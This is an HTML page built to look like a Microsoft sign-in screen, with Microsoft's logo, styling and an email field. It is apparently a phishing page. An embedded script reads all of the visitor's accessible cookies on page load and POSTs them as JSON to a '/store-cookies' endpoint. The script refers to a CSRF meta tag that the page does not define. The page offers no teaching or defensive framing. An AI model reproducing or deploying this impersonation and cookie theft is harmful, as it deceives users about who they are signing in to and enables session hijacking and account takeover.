<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Microsoft Sign In</title>
  <link rel="stylesheet" href="styles.css" />
<style>
    /* styles.css */
    body {
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f3f3f3;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    }

    .login-container {
    background-color: white;
    padding: 40px;
    width: 350px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    border-radius: 6px;
    }

    .logo {
    width: 100px;
    margin-bottom: 20px;
    }

    h2 {
    margin-bottom: 20px;
    font-weight: normal;
    }

    input[type="text"] {
    width: 100%;
    /* padding: 10px;
    margin-bottom: 20px;
    border-bottom: 1px solid #ccc;
    border-top: none;
    border-right: none;
    border-left: none;
    border-radius: 4px; */
    width: 100%;
    padding: 10px;
    margin-bottom: 20px;
    border: none;
    border-bottom: 1px solid #ccc;
    border-radius: 0;
    outline: none;
    }

    .links {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
    }

    .links a {
    font-size: 0.9em;
    color: #0067b8;
    text-decoration: none;
    }

    .links a:hover {
    text-decoration: underline;
    }

    .buttons {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
    }

    button {
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    }

    .back {
    background-color: #e6e6e6;
    }

    .next {
    background-color: #0067b8;
    color: white;
    }

    .options {
    display: flex;
    align-items: center;
    gap: 8px;
    }

    .options a {
    color: #0067b8;
    text-decoration: none;
    }

    .options a:hover {
    text-decoration: underline;
    }

  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo" />
    <h2>Sign in</h2>
    <input type="text" placeholder="Email, phone, or Skype" />
    <div class="links">
      <a href="#">Can't access your account?</a>
      <a href="#">Create one!</a>
    </div>
    <div class="buttons">
      <button class="back">Back</button>
      <button class="next">Next</button>
    </div>
    <div class="options">
      <span class="key-icon">🔑</span>
      <a href="#">Sign-in options</a>
    </div>
  </div>
  <script>
    function getAllCookies() {
    const cookies = document.cookie.split(';');
    const cookieObj = {};

    cookies.forEach(cookie => {
        const [name, ...rest] = cookie.split('=');
            cookieObj[name.trim()] = decodeURIComponent(rest.join('='));
        });

        return cookieObj;
        }

    // Send to Laravel via fetch
    fetch('/store-cookies', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
    },
    body: JSON.stringify(getAllCookies())
    });

    </script>
</body>
</html>
